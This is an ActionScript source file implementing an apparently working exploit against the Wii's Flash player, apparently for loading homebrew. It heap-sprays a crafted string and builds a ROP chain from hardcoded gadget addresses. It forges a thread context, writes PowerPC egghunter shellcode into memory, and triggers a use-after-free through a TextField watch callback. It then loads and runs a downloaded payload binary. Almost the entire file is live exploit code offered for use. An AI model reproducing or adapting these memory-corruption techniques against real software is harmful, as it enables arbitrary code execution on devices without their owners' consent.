//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

//Argument checking
//All arguments are checked from both the _root object and from the FlashVars namespace.
//This is to allow both Actionscript and Javascript to load the exploit.
//Actionscript arguments take priority over FlashVars arguments.

/*payload_file
 *	The name of the payload file to download.
 *  This file is loaded from Actionscript so it must be located on the same server as whatever is loading this.
 *	Defaults to payload.bin in the same directory that this file is loaded from.
 *Region
 *	The region of the wii that the exploit will be targeting.
 *	Defaults to U.
 *DownloadCallback
 *	Set this variable to a function that will be called with the number of bytes downloaded and total size of the payload.
 *	A good use of this for example would be to display a progress bar to the user while the payload downloads.
 *SkipDownload
 *	Set this to skip downloading the payload and skip straight to the exploit. Use this if you downloaded the payload already.
 *	Defaults to false.
 *DebugPayload
 *	Load a built-in payload that just makes the screen pink.
 *	Use for debugging if your not sure if the payload or the exploit is failing.
 *	If the screen turns pink then your payload is to blame.
 *	If not then you messed something up with the exploit.
 *	Defaults to false.
 *SprayIterations
 *	Number of times to spray the hax string in memory.
 *	If the Wii tells you that the page was too big to load then turn this number down.
 *	The default is 4096.
 *StringBaseAddress
 *	Expected location of string in memory after heap spray. You probably won't need to change this.
 *	Defaults to 0x9016f768 for U/J and 0x901a5368 for E.
 */

if (_root.payload_file != null){
	payload_file = _root.payload_file;
}else if (payload_file == null){
	payload_file = "payload.bin";
}

if (_root.isJP != null){
	isJP = _root.isJP;
}else if (isJP != null){
	isJP = isJP == "true";
}else{
	isJP = false;
}

if (_root.SkipDownload != null){
	SkipDownload = _root.SkipDownload;
}else if (SkipDownload != null){
	SkipDownload = SkipDownload == "true";
}else{
	SkipDownload = false;
}

if (_root.DebugPayload != null){
	DebugPayload = _root.DebugPayload;
}else if (DebugPayload != null){
	DebugPayload = DebugPayload == "true";
}else{
	DebugPayload = false;
}

if (_root.SprayIterations != null){
	SprayIterations = _root.SprayIterations;
}else if (SprayIterations != null){
	SprayIterations = Number(SprayIterations);
}else{
	SprayIterations = 0x1000;
}

if (_root.StringBaseAddress != null){
	StringBaseAddress = _root.StringBaseAddress;
}else if (StringBaseAddress != null){
	StringBaseAddress = Number(StringBaseAddress);
}else{
	StringBaseAddress = 0x901a5368;
}

//End of argument checking. The rest is just part of the exploit.

this.createTextField("TheTextFieldOfRandomness", 1, 2, 3, 4, 5); //Without at least one TextField the exploit fails. TODO: Why!?!?!?!

var payload:MovieClipLoader = new MovieClipLoader();
var payloadListener:Object = new Object();
payloadListener.onLoadComplete = function():Void{
	TriggerExploit();
}
payloadListener.onLoadProgress = function(target_mc:MovieClip, loadedBytes:Number, totalBytes:Number):Void{
	if (_root.DownloadCallback != null){
		if (typeof(_root.DownloadCallback) == "function"){
			_root.DownloadCallback(loadedBytes, totalBytes);
		}else{
			getURL("javascript:" + DownloadCallback + "(" + loadedBytes + ", " + totalBytes + ")");
		}
	}
}
payload.addListener(payloadListener);

var GarbageArray = new Array();

var ROPChain = "";

function NumToUniString(val:Number){
	return String.fromCharCode((val & 0xFFFF0000)/0x10000) + String.fromCharCode(val & 0x0000FFFF);
}

//WARNING: Can't handle any values or addresses with all null Unicode characters. Works fine with single null bytes.
function WriteToAddr(addr:Number, val:Number):Void{
	if (isJP){
		var ROPConstant1:Number = 0x80065eb4;
		var ROPConstant2:Number = 0x80065eac;
		var ROPConstant3:Number = 0x80065ea8;
	}else{ // U and E
		var ROPConstant1:Number = 0x80066714;
		var ROPConstant2:Number = 0x8006670c;
		var ROPConstant3:Number = 0x80066708;
	}
	ROPChain += NumToUniString(ROPConstant1) + NumToUniString(val) + "\u4141\u4141\u4141\u4141"; //Load value to write
	ROPChain += NumToUniString(ROPConstant2) + "\u4141\u4141" + NumToUniString(addr) + "\u4141\u4141"; //Load address to write
	ROPChain += NumToUniString(ROPConstant3) + "\u4141\u4141\u4141\u4141\u4141\u4141"; //Do write
}

var WriteAddr:Number = 0;

//Helper function to write 4 bytes to WriteAddr and advance the WriteAddr.
//The warning from above applies to this function as well.
function WriteDWORD(val:Number):Void{
	WriteToAddr(WriteAddr, val);
	WriteAddr += 4;
}

var LoopChain:String = "";
for (var i = 1; i <= 3; i++){ //Change from 3 to 4 to test on console without triggering the rop
	LoopChain += NumToUniString(StringBaseAddress + (0x18*i));
	LoopChain += "\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141"; //Padding
}

if (isJP){
	var TargetAddress:String = NumToUniString(0x80a7080c); //Address of stored thread context pointer - 4
}else{ // U and E
	var TargetAddress:String = NumToUniString(0x80a3d3cc); //Address of stored thread context pointer - 4
}

var ThreadContext:String = "";
/*
 * Thread context layout
 * 0x0-0x1e = r1-r31 respectively
 * 0x20 = lr
 * 0x21 = ctr
 * 0x65 = pc
 * 0x66 = msr
 * 0xb7 = random writable address needed
 *
 * Unfortunately registers 0-5 are clobbered with the write primitive.
 * This means no easy sp control :(
 */
for (var i = 0; i < (0x190); i++){
	switch (i){
		case 5:
			if (isJP){
				ThreadContext += NumToUniString(0x80062830); //r6 (really ends up as ctr)
			}else{ // U and E
				ThreadContext += NumToUniString(0x80063090); //r6 (really ends up as ctr)
			}
			break;
		case 11:
			ThreadContext += NumToUniString(StringBaseAddress+((LoopChain+TargetAddress).length*2)+(5*4)-0x70); //r12
			break;
		case 27:
			ThreadContext += NumToUniString(StringBaseAddress+((LoopChain+TargetAddress).length*2)+(0x190*4)-0x164); //r28
			break;
		case 0x65:
			if (isJP){
				ThreadContext += NumToUniString(0x8015c170); //pc
			}else{ // U and E
				ThreadContext += NumToUniString(0x8015c9d0); //pc
			}
			break;
		case 0x66:
			ThreadContext += NumToUniString(0x10000030); //msr (no Unicode null hack)
			break;
		case 0xb7:
			ThreadContext += NumToUniString(0x80000004); //Random writable address
			break;
		default:
			ThreadContext += "\u4242\u4242";
	}
}

var PayloadStart:Number = 0x80003400;
//We need to write to uncached MEM1 or else the values won't be there when executed.
WriteAddr = PayloadStart | 0xc0000000;

if (!DebugPayload){
	//Auto generated, see egghunter.s for source
	WriteDWORD(0x3c60504f);
	WriteDWORD(0x60634e59);
	WriteDWORD(0x3c80937f);
	WriteDWORD(0x6084fffc);
	WriteDWORD(0x3884fffc);
	WriteDWORD(0x80a4fff8);
	WriteDWORD(0x7c051840);
	WriteDWORD(0x4082fff4);
	WriteDWORD(0x80a4fffc);
	WriteDWORD(0x7c051840);
	WriteDWORD(0x4082ffe8);
	WriteDWORD(0x80a40004);
	WriteDWORD(0x38840004);
	WriteDWORD(0x83c40004);
	WriteDWORD(0x38840004);
	WriteDWORD(0x83a4fffc);
	WriteDWORD(0x3884fffc);
	WriteDWORD(0x7fa4ea14);
	WriteDWORD(0x38840008);
	WriteDWORD(0x3c608000);
	WriteDWORD(0x60633500);
	WriteDWORD(0x7c7f1b78);
	WriteDWORD(0x7ca903a6);
	WriteDWORD(0x3863fffc);
	WriteDWORD(0x3884fffc);
	WriteDWORD(0x86840004);
	WriteDWORD(0x96830004);
	WriteDWORD(0x4200fff8);
	WriteDWORD(0x7fe803a6);
	WriteDWORD(0x4e800020);
}else{ // Debug payload
	WriteDWORD(0x3ca09000);
	WriteDWORD(0x3c8092ff);
	WriteDWORD(0x3c60ffff);
	WriteDWORD(0x6063ffff);
	WriteDWORD(0x38a50004);
	WriteDWORD(0x90650004);
	WriteDWORD(0x7c052040);
	WriteDWORD(0x4082fff4);
	WriteDWORD(0x7c200b78);
	WriteDWORD(0x4bfffffc);
}

ROPChain += NumToUniString(PayloadStart);

var hax:String = LoopChain + TargetAddress + ThreadContext + ROPChain;

//Awesome suggestion from Chadderz and MrBean35000vr to pad the hax string to 0xd70 to make the string independent of screen type setting.

//0x4 for the i appended to the end and 0x14 bytes for heap headers. 
for (var i = 0; hax.length < (0xd70-0x18)/2; i++){
	hax += "\u4444";
}

var iArray = new Array(SprayIterations);
for (var i = 0; i < iArray.length; i++){
	iArray[i] = String.fromCharCode(i+1); //Precompute to reduce heap weirdness
}


var TheSprayNPrayArray = new Array(SprayIterations);

for (var i = 0; i < TheSprayNPrayArray.length; i++){
	TheSprayNPrayArray[i] = hax + iArray[i]; //Hope one of these lands on StringBaseAddress (i is added to the string to force a new string to be created)
}

function TriggerExploit(){
	var lv = new LoadVars();
	var f = lv.decode;
	var tf = this.createTextField("tf", 1, 2, 3, 4, 5);
	tf.rainbow = "best";
	function func(){
		tf.removeTextField();
		return NumToUniString(StringBaseAddress); //Hope we hit the hax string
	}
	tf.watch("rainbow", func);
	f.call(tf, "rainbow=fast&dash=1");

	//Trigger write
	for (var i = 0; i < 1000; i++){
		GarbageArray[i] = i;
	}
}

if (SkipDownload){
	TriggerExploit();
}else{
	payload.loadClip(payload_file, 1);
}